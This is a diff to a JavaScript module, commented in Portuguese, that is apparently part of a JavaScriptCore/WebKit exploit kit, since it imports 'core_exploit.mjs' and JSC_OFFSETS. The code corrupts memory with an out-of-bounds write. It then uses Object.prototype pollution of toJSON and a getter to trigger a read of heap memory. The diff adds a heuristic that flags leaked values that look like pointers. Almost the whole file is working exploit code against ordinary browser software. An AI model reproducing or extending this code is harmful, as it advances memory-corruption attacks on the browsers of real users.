@@ -11,35 +11,25 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForWideSnoop";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSnoopNoZero";
 let getter_called_flag = false;
 let current_test_results = { success: false, message: "Teste não iniciado.", error: null, snoop_data: [] };
 
 const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-// Janela de sondagem mais ampla (ex: os primeiros 256 bytes do oob_array_buffer_real)
-// Certifique-se de que oob_read_absolute pode ler a partir do offset 0 do oob_array_buffer_real.
-// oob_read_absolute usa oob_dataview_real, que tem um byteOffset.
-// Precisamos ler em relação ao início do oob_array_buffer_real.
-// A função oob_read_absolute já faz offset - oob_dataview_real.byteOffset, então
-// passar 0 para oob_read_absolute lê do início da DataView, não do ArrayBuffer.
-// Para este teste, vamos assumir que oob_read_absolute lê a partir do início do ArrayBuffer se o offset for < BASE_OFFSET_IN_DV,
-// ou modificaremos oob_read_absolute para ter essa capacidade se necessário.
-// Por agora, vamos sondar a partir de 0 relativo ao oob_array_buffer_real.
-
 const WIDE_SNOOP_START_OFFSET = 0x0;
 const WIDE_SNOOP_END_OFFSET = 0x100; // Sondar os primeiros 256 bytes
 
-class CheckpointObjectForWideSnoop {
+class CheckpointObjectForSnoopNoZero {
     constructor(id) {
-        this.id = `WideSnoopCheckpoint-${id}`;
+        this.id = `SnoopNoZeroCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerWideSnoopGetter() {
-    const FNAME_toJSON = "toJSON_TriggerWideSnoopGetter";
-    if (this instanceof CheckpointObjectForWideSnoop) {
+export function toJSON_TriggerSnoopNoZeroGetter() {
+    const FNAME_toJSON = "toJSON_TriggerSnoopNoZeroGetter";
+    if (this instanceof CheckpointObjectForSnoopNoZero) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
         try {
             // eslint-disable-next-line no-unused-vars
@@ -52,8 +42,8 @@ export function toJSON_TriggerWideSnoopGetter() {
 }
 
 export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeWideHeapSnoopInGetter"; // Nome interno
-    logS3(`--- Iniciando Teste de Sondagem Ampla de Heap no Getter ---`, "test", FNAME_TEST);
+    const FNAME_TEST = "executeSnoopNoZeroInGetter"; // Nome interno
+    logS3(`--- Iniciando Teste de Sondagem Ampla (Sem Zerar) no Getter ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
     current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, snoop_data: [] };
@@ -75,31 +65,21 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // Opcional: Limpar a janela de sondagem ampla ANTES da escrita gatilho
-        logS3(`Limpando (zerando) janela de sondagem de ${toHex(WIDE_SNOOP_START_OFFSET)} a ${toHex(WIDE_SNOOP_END_OFFSET)}...`, "info", FNAME_TEST);
-        for (let offset = WIDE_SNOOP_START_OFFSET; offset < WIDE_SNOOP_END_OFFSET; offset += 8) {
-             if (offset >= 0 && (offset + 8) <= oob_array_buffer_real.byteLength) {
-                try {
-                    oob_write_absolute(offset, AdvancedInt64.Zero, 8);
-                } catch (e) { /* ignorar se não puder escrever em alguma parte */ }
-            }
-        }
-        logS3("Janela de sondagem zerada.", "info", FNAME_TEST);
-
+        // NÃO vamos zerar a janela de sondagem desta vez.
 
         // 1. Realizar a escrita OOB "gatilho"
         oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} com ${CORRUPTION_VALUE.toString(true)} completada.`, "info", FNAME_TEST);
 
         // 2. Configurar o getter e poluir
-        const checkpoint_obj = new CheckpointObjectForWideSnoop(1);
-        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForWideSnoop.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+        const checkpoint_obj = new CheckpointObjectForSnoopNoZero(1);
+        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
-        Object.defineProperty(CheckpointObjectForWideSnoop.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
+        Object.defineProperty(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() { // Getter SÍNCRONO
                 getter_called_flag = true;
-                const FNAME_GETTER = "WideHeapSnoop_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Sondando memória amplamente...`, "vuln", FNAME_GETTER);
+                const FNAME_GETTER = "SnoopNoZero_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Sondando memória (sem zerar previamente)...`, "vuln", FNAME_GETTER);
                 
                 let snoop_results_temp = [];
                 let interesting_values_found = 0;
@@ -107,43 +87,50 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
                 try {
                     if (!oob_read_absolute) { /* ... erro ... */ return 0xDEADDEAD; }
 
-                    logS3(`DENTRO DO GETTER: Sondando de ${toHex(WIDE_SNOOP_START_OFFSET)} a ${toHex(WIDE_SNOOP_END_OFFSET)} (offsets relativos ao oob_ab_data)...`, "info", FNAME_GETTER);
+                    logS3(`DENTRO DO GETTER: Sondando de ${toHex(WIDE_SNOOP_START_OFFSET)} a ${toHex(WIDE_SNOOP_END_OFFSET)}...`, "info", FNAME_GETTER);
                     
                     for (let offset = WIDE_SNOOP_START_OFFSET; offset < WIDE_SNOOP_END_OFFSET; offset += 8) { // Ler de 8 em 8 bytes
                         if (offset < 0 || (offset + 8) > oob_array_buffer_real.byteLength) {
-                            // logS3(`Skipping offset ${toHex(offset)} (fora dos limites do buffer)`, "warn", FNAME_GETTER);
                             continue;
                         }
                         try {
                             const value_read = oob_read_absolute(offset, 8); // Ler 8 bytes
                             const value_is_corruption_val = (offset === CORRUPTION_OFFSET && value_read instanceof AdvancedInt64 && value_read.equals(CORRUPTION_VALUE));
                             
-                            // Logar apenas valores não-zero (a menos que seja o valor da corrupção em si)
+                            // Logar apenas valores não-zero (ou o valor da corrupção)
+                            // Se o buffer não foi zerado, esperamos ver o conteúdo inicial ou lixo.
                             if (!value_read.equals(AdvancedInt64.Zero) || value_is_corruption_val) {
                                 const value_str = value_read instanceof AdvancedInt64 ? value_read.toString(true) : toHex(value_read, 64);
                                 snoop_results_temp.push({offset: toHex(offset), value: value_str});
-                                logS3(`SNOOP_WIDE: oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);
+                                logS3(`SNOOP_NOZERO: oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);
                                 if (!value_is_corruption_val && !value_read.equals(AdvancedInt64.Zero)) {
-                                    interesting_values_found++;
+                                    // Aplicar heurística de ponteiro aqui
+                                    if (value_read instanceof AdvancedInt64 && (value_read.high() > 0x00010000 || value_read.high() < 0) && value_read.high() !== 0xFFFFFFFF) {
+                                        logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
+                                        interesting_values_found++;
+                                    } else if (! (value_read instanceof AdvancedInt64) && value_read > 0x100000000){ // number
+                                         logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
+                                        interesting_values_found++;
+                                    }
                                 }
                             }
                         } catch (e_read) {
-                            logS3(`SNOOP_WIDE: Erro ao ler oob_data[${toHex(offset)}]: ${e_read.message}`, "error", FNAME_GETTER);
+                            logS3(`SNOOP_NOZERO: Erro ao ler oob_data[${toHex(offset)}]: ${e_read.message}`, "error", FNAME_GETTER);
                             snoop_results_temp.push({offset: toHex(offset), value: `ERRO_LEITURA: ${e_read.message}`});
                         }
                     }
                     current_test_results.snoop_data = snoop_results_temp;
                     if (interesting_values_found > 0) {
-                        current_test_results.success = true; // Sucesso se encontramos algo além do valor da corrupção e zeros
-                        current_test_results.message = `Sondagem ampla encontrou ${interesting_values_found} valor(es) não-zero inesperado(s).`;
+                        current_test_results.success = true;
+                        current_test_results.message = `Sondagem (sem zerar) encontrou ${interesting_values_found} valor(es) suspeito(s).`;
                     } else {
-                        current_test_results.message = "Sondagem ampla completada, nenhum valor inesperado (não-zero, não-corrupção) encontrado.";
+                        current_test_results.message = "Sondagem (sem zerar) completada, nenhum vazamento óbvio ou valor inesperado encontrado.";
                     }
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO GERAL durante sondagem ampla: ${e.message}`, "error", FNAME_GETTER);
+                    logS3(`DENTRO DO GETTER: ERRO GERAL durante sondagem: ${e.message}`, "error", FNAME_GETTER);
                     current_test_results.error = String(e);
-                    current_test_results.message = `Erro geral na sondagem ampla: ${e.message}`;
+                    current_test_results.message = `Erro geral na sondagem: ${e.message}`;
                 }
                 return 0xBADF00D;
             },
@@ -152,7 +139,7 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         getterPollutionApplied = true;
 
         originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
-        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerWideSnoopGetter, writable: true, enumerable: false, configurable: true});
+        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSnoopNoZeroGetter, writable: true, enumerable: false, configurable: true});
         toJSONPollutionApplied = true;
         logS3(`Poluições aplicadas.`, "info", FNAME_TEST);
 
@@ -168,9 +155,9 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO SONDAGEM AMPLA: ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO SONDAGEM (SEM ZERAR): ${current_test_results.message}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO SONDAGEM AMPLA: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO SONDAGEM (SEM ZERAR): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
         }
         logS3("Dados Sondados (Offset: Valor) - Apenas não-zero ou valor da corrupção:", "info", FNAME_TEST);
         current_test_results.snoop_data.forEach(item => {
@@ -179,5 +166,5 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
     } else { /* ... getter não chamado ... */ }
 
     clearOOBEnvironment();
-    logS3(`--- Teste de Sondagem Ampla de Heap Concluído ---`, "test", FNAME_TEST);
+    logS3(`--- Teste de Sondagem Ampla (Sem Zerar) Concluído ---`, "test", FNAME_TEST);
 }
